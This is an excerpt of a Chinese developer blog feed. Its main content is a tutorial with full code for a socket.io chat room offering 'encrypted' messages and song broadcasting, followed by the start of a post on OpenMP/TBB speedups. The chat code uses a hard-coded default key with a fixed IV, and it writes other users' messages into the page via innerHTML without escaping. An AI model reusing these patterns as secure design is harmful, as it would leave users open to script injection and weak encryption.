express.static(&apos;public&apos;),</div><div class="line">    express.bodyParser()</div><div class="line">);</div><div class="line">app.listen(3000);</div><div class="line">//把socket.io绑定app服务端，使用封装接口</div><div class="line">var io = sio.listen(app);</div><div class="line">//歌曲用id号识别，现在这首歌是陈奕迅的“你给我听好”</div><div class="line">var cnt = 0,</div><div class="line">    dj, currentsong = &apos;28481103&apos;;</div><div class="line">//选举dj的函数，当前可以广播歌曲的用户离开后，权限交给下一个连接进来的用户</div><div class="line">function elect(socket) &#123;</div><div class="line">    dj = socket;</div><div class="line">    io.sockets.emit(&apos;annoucement&apos;, socket.nickname + &apos; is the new dj&apos;);</div><div class="line">    socket.emit(&apos;elected&apos;);</div><div class="line">    socket.dj = true;</div><div class="line">    socket.on(&apos;disconnect&apos;, function () &#123;</div><div class="line">        dj = null;</div><div class="line">        io.sockets.emit(&apos;annoucement&apos;, &apos;the dj left - next one to join becomes dj&apos;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">io.sockets.on(&apos;connection&apos;, function (socket) &#123;</div><div class="line">    console.log(&apos;someone connected&apos;);</div><div class="line">    //用flag判断第一次系统提示</div><div class="line">    if (!socket.flag) &#123;</div><div class="line">        socket.emit(&apos;text&apos;, &apos;系统&apos;, &apos;欢迎进入Hac聊天室v2.0~ \n目前支持的功能有：1.(聊天)信息加密传输/2.获取秘钥解密/3.管理员点歌广播&apos;);</div><div class="line">        // 目前支持的功能有：1.(聊天)信息加密传输/2.获取秘钥解密/3.管理员点歌广播</div><div class="line">        socket.emit(&apos;text&apos;, &apos;系统&apos;, &apos;当前在线聊天的人数为：&apos; + cnt);</div><div class="line">        if (dj) &#123;</div><div class="line">            socket.emit(&apos;text&apos;, &apos;系统&apos;, &apos;可以广播音乐的是：&apos; + dj.nickname);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    socket.flag = true;</div><div class="line">    //监听新用户的连接，并自动点歌</div><div class="line">    socket.on(&apos;join&apos;, function (name) &#123;</div><div class="line">        socket.nickname = name;</div><div class="line">        cnt++;</div><div class="line">        if (!dj) &#123;</div><div class="line">            elect(socket);</div><div class="line">        &#125; else &#123;</div><div class="line">            socket.emit(&apos;song&apos;, currentsong);</div><div class="line">        &#125;</div><div class="line">        socket.broadcast.emit(&apos;announcement&apos;, name + &apos; joined the chat.&apos;);</div><div class="line">    &#125;);</div><div class="line">    //接听其他用户发的消息</div><div class="line">    socket.on(&apos;text&apos;, function (msg) &#123;</div><div class="line">        socket.broadcast.emit(&apos;text&apos;, socket.nickname, msg);</div><div class="line">    &#125;);</div><div class="line">    socket.on(&apos;disconnect&apos;, function () &#123;</div><div class="line">        cnt--;</div><div class="line">        socket.dj = false;</div><div class="line">        dj = null;</div><div class="line">    &#125;);</div><div class="line">    //接听管理员广播的音乐</div><div class="line">    socket.on(&apos;song&apos;, function (id) &#123;</div><div class="line">        if (socket.dj) &#123;</div><div class="line">            currentsong = id;</div><div class="line">            socket.broadcast.emit(&apos;song&apos;, id);</div><div class="line">        &#125; else &#123;</div><div class="line">            socket.emit(&apos;text&apos;, &apos;系统&apos;, &apos;当前管理电台的用户是：&apos; + dj.nickname + &apos;\n您暂时只能本地点歌播放&apos;);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>可以看一下我的服务器后台输出<br><img src="http://op72m4y17.bkt.clouddn.com/66666.png" alt="后台测试输出"><br><img src="http://op72m4y17.bkt.clouddn.com/666.png" alt="后台测试输出"></p>
<h3 id="客户端chat-js代码一览"><a href="#客户端chat-js代码一览" class="headerlink" title="客户端chat.js代码一览"></a>客户端chat.js代码一览</h3><p>Guillermo Rauch写的socket.io具有非常强大的特性：</p>
<ul>
<li>1.消息传递是基于传输的，而非全部依靠WebSocket,从IE6到IOS都支持，而且会自动使用像long polling这样复杂的技术，但api保持了与websoket一样的简洁，即使浏览器支持的WebSocket被代理或防火墙禁止了，Socket.io依然能够通过采用别的技术来处理这类问题</li>
<li>2.对超时的支持，无需过多担心网络的各种不确定情况，当连接丢失时，socket.io默认会自动重连</li>
<li>3.允许在单个连接中利用命名空间来将消息彼此区分开来，利用多路传输使得socket不必非得是自己分配的真正的TCP socket<br>以上几点就是我为什么膜Guillermo Rauch的原因了，以后的博文里可能还会介绍Guillermo Rauch写的更多的优秀的项目，在未来我也立志写出这样的可以给大家共享的好模块！<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div></pre></td><td class="code"><pre><div class="line">   var sig_flag = 0;</div><div class="line">   var current_song, key, default_key = &apos;751f621ea5c8f930&apos;;</div><div class="line">   var me;</div><div class="line">   var dj_flag = false;</div><div class="line">   var jm_flag = false;</div><div class="line"></div><div class="line"> //这里是自己根据曲库id号来编写的一个播放函数，网易云音乐有外链音乐url，但id号规则不明，后期我将尝试用python爬虫+node.js导入音乐api接口</div><div class="line">   function play(id) &#123;</div><div class="line">       var music = document.getElementById(&apos;music&apos;);</div><div class="line">       music.innerHTML = &quot;&lt;iframe frameborder=&apos;no&apos; border=&apos;0&apos; marginwidth=&apos;0&apos; marginheight=&apos;0&apos; width=&apos;330&apos; height=&apos;86&apos; src=&apos;//music.163.com/outchain/player?type=2&amp;amp;id=&quot; + id + &quot;&amp;amp;auto=1&amp;amp;height=66&apos;&gt;&lt;/iframe&gt;&quot;;</div><div class="line">       if (dj_flag) &#123;</div><div class="line">           current_song = id;</div><div class="line">           if (sig_flag === 0) &#123;</div><div class="line">               sig_flag = 1;</div><div class="line">           &#125;</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">//是否要加密</div><div class="line">   function jm_or_not(jm) &#123;</div><div class="line">       if (jm) &#123;</div><div class="line">           jm_flag = true;</div><div class="line">           var yourkey = document.getElementById(&apos;password&apos;).value;</div><div class="line">           key = yourkey;</div><div class="line">       &#125; else &#123;</div><div class="line">           key = null;</div><div class="line">           jm_flag = false;</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"> //aes-128-cbc加密函数</div><div class="line">   function encrypt(mykey, word) &#123;</div><div class="line">       mykey = mykey + default_key.substring(mykey.length);</div><div class="line">       var key = CryptoJS.enc.Utf8.parse(mykey); //16位</div><div class="line">       var iv = CryptoJS.enc.Utf8.parse(&quot;5683022032017429&quot;);</div><div class="line">       var encrypted = &apos;&apos;;</div><div class="line">       if (typeof (word) == &apos;string&apos;) &#123;</div><div class="line">           var srcs = CryptoJS.enc.Utf8.parse(word);</div><div class="line">           encrypted = CryptoJS.AES.encrypt(srcs, key, &#123;</div><div class="line">               iv: iv,</div><div class="line">               mode: CryptoJS.mode.CBC,</div><div class="line">               padding: CryptoJS.pad.Pkcs7</div><div class="line">           &#125;);</div><div class="line">       &#125; else if (typeof (word) == &apos;object&apos;) &#123; //对象格式的转成json字符串</div><div class="line">           data = JSON.stringify(word);</div><div class="line">           var srcs = CryptoJS.enc.Utf8.parse(data);</div><div class="line">           encrypted = CryptoJS.AES.encrypt(srcs, key, &#123;</div><div class="line">               iv: iv,</div><div class="line">               mode: CryptoJS.mode.CBC,</div><div class="line">               padding: CryptoJS.pad.Pkcs7</div><div class="line">           &#125;)</div><div class="line">       &#125;</div><div class="line">       return encrypted.ciphertext.toString();</div><div class="line">   &#125;</div><div class="line">   // aes-128-cbc解密函数</div><div class="line">   function decrypt(other_key, word) &#123;</div><div class="line">       other_key = other_key + default_key.substring(other_key.length);</div><div class="line">       var key = CryptoJS.enc.Utf8.parse(other_key);</div><div class="line">       var iv = CryptoJS.enc.Utf8.parse(&quot;5683022032017429&quot;);</div><div class="line">       var encryptedHexStr = CryptoJS.enc.Hex.parse(word);</div><div class="line">       var srcs = CryptoJS.enc.Base64.stringify(encryptedHexStr);</div><div class="line">       var decrypt = CryptoJS.AES.decrypt(srcs, key, &#123;</div><div class="line">           iv: iv,</div><div class="line">           mode: CryptoJS.mode.CBC,</div><div class="line">           padding: CryptoJS.pad.Pkcs7</div><div class="line">       &#125;);</div><div class="line">       var decryptedStr = decrypt.toString(CryptoJS.enc.Utf8);</div><div class="line">       return decryptedStr.toString();</div><div class="line">   &#125;</div><div class="line">//加密按钮点击后响应的函数，保存用户key</div><div class="line">   function decode() &#123;</div><div class="line">       var deco_content = document.getElementById(&apos;2decode&apos;).value;</div><div class="line">       var other_key = document.getElementById(&apos;other_key&apos;).value;</div><div class="line">       var encoded = document.getElementById(&apos;encoded&apos;);</div><div class="line">       console.log(deco_content);</div><div class="line">       var test = decrypt(other_key, deco_content);</div><div class="line">       console.log(test);</div><div class="line">       encoded.innerHTML = decrypt(other_key, deco_content);</div><div class="line"></div><div class="line">   &#125;</div><div class="line">   //一开始就要加载的网络连接函数</div><div class="line">   window.onload = function () &#123;</div><div class="line">       var socket = io.connect();</div><div class="line">       me = socket;</div><div class="line">       socket.on(&apos;elected&apos;, function () &#123;</div><div class="line">           dj_flag = true;</div><div class="line">       &#125;);</div><div class="line">       socket.on(&apos;connect&apos;, function () &#123;</div><div class="line">           var name = prompt(&apos;What is your nickname?&apos;);</div><div class="line">           var currentnum = 0;</div><div class="line">           socket.emit(&apos;join&apos;, name);</div><div class="line">           document.getElementById(&apos;me&apos;).innerHTML = &quot;Your Name:&amp;nbsp;&quot; + name;</div><div class="line">           console.log(&apos;jinle&apos;);</div><div class="line">           document.getElementById(&apos;chat&apos;).style.display = &apos;block&apos;;</div><div class="line">           console.log(&apos;?&apos;);</div><div class="line">           var songs = document.getElementById(&apos;songs&apos;);</div><div class="line">           var music = document.getElementById(&apos;music&apos;);</div><div class="line">           //把歌曲添加进去，下一次版本迭代将不会采取这样的方法，因为比较麻烦(！都是陈奕迅的歌)</div><div class="line">           songs.innerHTML = &quot;&lt;li&gt;你给我听好   -陈奕迅&lt;a href=&apos;#&apos;&apos; onclick=&apos;play(28481103)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;陪你度过漫长岁月   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(35403523)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;　&lt;/li&gt;&lt;li&gt;红玫瑰   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(65126)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;好久不见   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(65538)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;苦瓜   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(64293)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;可以了   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(28481818)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;富士山下   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(65766)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;不要说话   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(25906124)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;淘汰   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(65528)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;阴天快乐   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(28563317)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;夕阳无限好   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(66272)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;因为爱情   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(64317)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;孤独患者   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(64093)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;稳稳的幸福   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(25730757)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;最佳损友   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(65800)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&lt;li&gt;约定   -陈奕迅&lt;a href=&apos;#&apos; onclick=&apos;play(64443)&apos;&gt;&amp;nbsp;select √&lt;/a&gt;&lt;/li&gt;&quot;;</div><div class="line">           if (socket.dj) &#123;</div><div class="line">               dj_flag = true;</div><div class="line">           &#125;</div><div class="line">           socket.on(&apos;announcement&apos;, function (msg) &#123;</div><div class="line">               var li = document.createElement(&apos;li&apos;);</div><div class="line">               li.className = &apos;announcement&apos;;</div><div class="line">               li.innerHTML = msg;</div><div class="line">               document.getElementById(&apos;messages&apos;).appendChild(li);</div><div class="line">           &#125;);</div><div class="line">           socket.on(&apos;song&apos;, play);</div><div class="line">       &#125;);</div><div class="line">       //往网页加入信息的函数，简单的js动态实现</div><div class="line">       function addMessage(from, text) &#123;</div><div class="line">           var lis = document.getElementById(&apos;messages&apos;);</div><div class="line">           if (lis.children.length &lt; 12) &#123;</div><div class="line">               var li = document.createElement(&apos;li&apos;);</div><div class="line">               li.className = &apos;message&apos;;</div><div class="line">               li.innerHTML = &apos;&lt;b&gt;&apos; + from + &apos;&lt;/b&gt;: &apos; + text;</div><div class="line">               document.getElementById(&apos;messages&apos;).appendChild(li);</div><div class="line">           &#125; else &#123;</div><div class="line">               for (var i = 0; i &lt; 11; i++) &#123;</div><div class="line">                   lis.children[i].innerHTML = lis.children[i + 1].innerHTML;</div><div class="line">               &#125;</div><div class="line">               lis.children[11].innerHTML = &apos;&lt;b&gt;&apos; + from + &apos;&lt;/b&gt;: &apos; + text;</div><div class="line">           &#125;</div><div class="line">           if (sig_flag === 1 &amp;&amp; current_song) &#123;</div><div class="line">               sig_flag = 0;</div><div class="line">               socket.emit(&apos;song&apos;, current_song);</div><div class="line">           &#125;</div><div class="line">           console.log(text);</div><div class="line">       &#125;</div><div class="line">       var input = document.getElementById(&apos;input&apos;);</div><div class="line">       document.getElementById(&apos;form&apos;).onsubmit = function () &#123;</div><div class="line">           addMessage(&apos;me&apos;, input.value);</div><div class="line">           if (jm_flag) &#123;</div><div class="line">               socket.emit(&apos;text&apos;, encrypt(key, input.value));</div><div class="line">           &#125; else &#123;</div><div class="line">           //向服务器发送信息</div><div class="line">               socket.emit(&apos;text&apos;, input.value);</div><div class="line">           &#125;</div><div class="line">           input.value = &apos;&apos;;</div><div class="line">           input.focus();</div><div class="line">           return false;</div><div class="line">       &#125;</div><div class="line">       //接听服务器发来的信息</div><div class="line">       socket.on(&apos;text&apos;, addMessage);</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<h3 id="主页index-html代码一览"><a href="#主页index-html代码一览" class="headerlink" title="主页index.html代码一览"></a>主页index.html代码一览</h3><blockquote>
<p>要时刻记住代码越规范，可精简的空间就越大，你会发现我的index.html代码不多，因为很多封装到js里便于维护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;zh&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&quot;js/core.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&quot;js/enc-base64.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&quot;js/x64-core.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&quot;js/lib-typedarrays.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&quot;js/cipher-core.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&quot;js/aes.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&apos;js/chat.js&apos;&gt;&lt;/script&gt;</div><div class="line">	&lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">	&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;</div><div class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</div><div class="line">	&lt;title&gt;基于node.js的聊天页面&lt;/title&gt;</div><div class="line">	&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</div><div class="line">	&lt;link rel=&quot;stylesheet&quot; href=&quot;css/buttons.css&quot;&gt;</div><div class="line">	&lt;!--[if IE]&gt;</div><div class="line">		&lt;script src=&quot;http://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;![endif]--&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;div class=&quot;bg&quot;&gt;&lt;/div&gt;</div><div class="line">	&lt;div id=&apos;chat&apos; style=&quot;display: none&quot; class=&quot;phone&quot;&gt;</div><div class="line">		&lt;div class=&quot;screen&quot;&gt;</div><div class="line">			&lt;h1 id=&apos;ks&apos; class=&quot;hello&quot;&gt;Welcome!</div><div class="line">			&lt;/h1&gt;</div><div class="line">			&lt;h1 id=&apos;a&apos; class=&apos;user&apos;&gt;</div><div class="line">				密文</div><div class="line">				&lt;p style=&quot;margin-top:20px&quot;&gt;点歌&lt;/p&gt;</div><div class="line">			&lt;/h1&gt;</div><div class="line">			&lt;h1 id=&apos;b&apos; class=&apos;chat&apos;&gt;</div><div class="line">				返回</div><div class="line">			&lt;/h1&gt;</div><div class="line">			&lt;h1 id=&apos;c&apos; class=&apos;clean&apos;&gt;</div><div class="line">				清屏</div><div class="line">			&lt;/h1&gt;</div><div class="line">			&lt;div class=&quot;nav&quot;&gt;</div><div class="line">				&lt;a class=&quot;home&quot; href=&quot;#&quot;&gt;</div><div class="line">					&lt;img class=&quot;open&quot; src=&quot;img/menu.svg&quot; title=&quot;Menu&quot; width=&quot;30&quot;&gt;</div><div class="line">					&lt;img class=&quot;close&quot; src=&quot;img/close.svg&quot; title=&quot;Close&quot; width=&quot;30&quot;&gt;</div><div class="line">				&lt;/a&gt;</div><div class="line">				&lt;a class=&quot;item profile&quot; href=&quot;#&quot; onclick=&quot;gr()&quot;&gt;&lt;img src=&quot;img/user.svg&quot; alt=&quot;User&quot; width=&quot;25&quot;&gt;&lt;/a&gt;</div><div class="line">				&lt;a class=&quot;item like&quot; href=&quot;#&quot; onclick=&quot;mc()&quot;&gt;&lt;img src=&quot;img/heart.svg&quot; alt=&quot;Like&quot; width=&quot;25&quot;&gt;&lt;/a&gt;</div><div class="line">				&lt;a class=&quot;item message&quot; href=&quot;#&quot; onclick=&quot;hf()&quot;&gt;&lt;img src=&quot;img/message.svg&quot; alt=&quot;Message&quot; width=&quot;25&quot;&gt;&lt;/a&gt;</div><div class="line">				&lt;a class=&quot;item tools&quot; href=&quot;#&quot; onclick=&quot;clean()&quot;&gt;&lt;img src=&quot;img/tools.svg&quot; title=&quot;Tools&quot; width=&quot;25&quot;&gt;&lt;/a&gt;</div><div class="line">			&lt;/div&gt;</div><div class="line">			&lt;br/&gt;</div><div class="line">			&lt;br/&gt;</div><div class="line">			&lt;br/&gt;</div><div class="line">			&lt;h3 id=&apos;js&apos;&gt;&lt;/h3&gt;</div><div class="line">			&lt;div id=&apos;jm&apos;&gt;&lt;/div&gt;</div><div class="line">			&lt;form id=&quot;form&quot;&gt;</div><div class="line">				&lt;p id=&apos;me&apos; style=&quot;color: red&quot;&gt;用户名: 当前在线人数：</div><div class="line">					&lt;p&gt;</div><div class="line">						&lt;input type=&quot;text&quot; maxlength=&quot;16&quot; id=&quot;input&quot; /&gt;</div><div class="line">						&lt;button class=&quot;button button-glow button-border button-rounded button-primary&quot;&gt;Send&lt;/button&gt;</div><div class="line">			&lt;/form&gt;</div><div class="line">			&lt;ul id=&apos;messages&apos;&gt;</div><div class="line">			&lt;/ul&gt;</div><div class="line">			&lt;div id=&apos;music&apos; class=&apos;footer&apos;&gt;</div><div class="line">			&lt;/div&gt;</div><div class="line">			&lt;ul style=&apos;display:none&apos; id=&apos;songs&apos;&gt;</div><div class="line">			&lt;/ul&gt;</div><div class="line">		&lt;/div&gt;</div><div class="line">	&lt;/div&gt;</div><div class="line">	&lt;script src=&quot;http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&apos;js/TweenMax.min.js&apos;&gt;&lt;/script&gt;</div><div class="line">	&lt;script src=&apos;js/inner.js&apos;&gt;&lt;/script&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>add_songs.js/inner.js代码就不展示了，比较简单，add_songs.js已经不需要了(我封装到chat.js里面了),inner.js主要就是页面的加载以及动态效果的实现，如果想看代码的话请移步<a href="https://github.com/Kali-Hac/node_js_chat" target="_blank" rel="external">我的github本项目开源代码</a>PS：移动端代码会有所不同。</p>
</blockquote>
<h2 id="将会在下一篇博文总结一下开发中的问题-amp-解决方法"><a href="#将会在下一篇博文总结一下开发中的问题-amp-解决方法" class="headerlink" title="将会在下一篇博文总结一下开发中的问题&amp;解决方法"></a>将会在下一篇博文总结一下开发中的问题&amp;解决方法</h2><blockquote>
<p>本聊天项目已经嵌入到博客中(仅面向手机端开放，pc端已禁)，可以点进去测试一下(暂时仅供内部测试，可能会有一些bug还未发现，下一个版本会更完善)，另，各位小伙伴有任何问题可以在下方留言，我会及时解答或订正<br><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 作者:Hac </category>
            
            <category> Node.js实战笔记 </category>
            
            <category> Node.js网络通讯后台的搭建 </category>
            
            <category> JavaScript聊天动态界面的构建 </category>
            
            <category> crypto加密模块的网页嵌入(CryptoJS) </category>
            
            <category> 1.(聊天)信息加密传输/2.获取秘钥解密/3.管理员点歌广播的后台实现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket.io </tag>
            
            <tag> express </tag>
            
            <tag> CryptoJS </tag>
            
            <tag> HTTP/WebSocket </tag>
            
            <tag> Aes-128-cbc对称加密 </tag>
            
            <tag> 在线聊天/点歌系统 </tag>
            
            <tag> 通讯加密的应用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[几行指令让你的C++代码速度提升100%+，了解一下？]]></title>
      <url>http://yikunhaocong.com/2017/03/31/tbb/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>主要讲解VS内置OpenMP库的使用和Intel_TBB开源库的配置，与普通C++代码串行运行的速度进行对比，教会你如何快速使用OpenMP和Intel_TBB内置的并行算法使你的C++代码运行速度大幅度提升(充分调用CPU开启多线程)。<p></p>
<a id="more"></a>
<h2 id="Hac博客声明！"><a href="#Hac博客声明！" class="headerlink" title="Hac博客声明！"></a>Hac博客声明！</h2><ul>
<li>本博客中带有<a href="http://blog.csdn.net/CSDN568302203" target="_blank" rel="external">http://blog.csdn.net/CSDN568302203</a>博客水印的图片都是本人Hac所有，一年前开的博客，现用于方便地存储文章图片。<h2 id="直接上相同代码速度对比图-记录C-运行速度，python绘图"><a href="#直接上相同代码速度对比图-记录C-运行速度，python绘图" class="headerlink" title="直接上相同代码速度对比图(记录C++运行速度，python绘图)"></a>直接上相同代码速度对比图(记录C++运行速度，python绘图)</h2></li>
</ul>
<h3 id="C-内置快排与tbb-openmp内置快排的速度对比图"><a href="#C-内置快排与tbb-openmp内置快排的速度对比图" class="headerlink" title="C++内置快排与tbb,openmp内置快排的速度对比图"></a>C++内置快排与tbb,openmp内置快排的速度对比图</h3><blockquote>
<ul>
<li>排序数量级由1到10^7，在10^5之前似乎看不出区别<br><img src="http://img.blog.csdn.net/20170331234249525?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="在10^5数量级之后会有很显著的区别"></li>
<li>可以看到，使用tbb,openmp内置并行排序算法所用的时间不到普通<algorithm>库串行sort算法的一半，原代码是一模一样的，只是调用cpu线程执行的方式不同，可以看一下我的cpu情况：<br><img src="http://img.blog.csdn.net/20170331234821856?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="每个CPU都被调用了，不过这个并不是执行时的真实情况，但是基本情况相同"></algorithm></li>
</ul>
</blockquote>
<h3 id="再看一下随机赋值情况，10-7为基数，增加1到100个10-6的数量级的速度对比"><a href="#再看一下随机赋值情况，10-7为基数，增加1到100个10-6的数量级的速度对比" class="headerlink" title="再看一下随机赋值情况，10^7为基数，增加1到100个10^6的数量级的速度对比"></a>再看一下随机赋值情况，10^7为基数，增加1到100个10^6的数量级的速度对比</h3><p><img src="http://img.blog.csdn.net/20170331235422125?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="代码执行速度超过普通的2倍！"></p>
<blockquote>
<p>可以看到虽然执行时间有所波动，但是以openMP和Inter_tbb库并行执行for循环赋值速度还是基本稳定在普通for循环赋值速度的两倍以上，可见OpenMP和Intel_TBB多线程库的强大。</p>
</blockquote>
<ul>
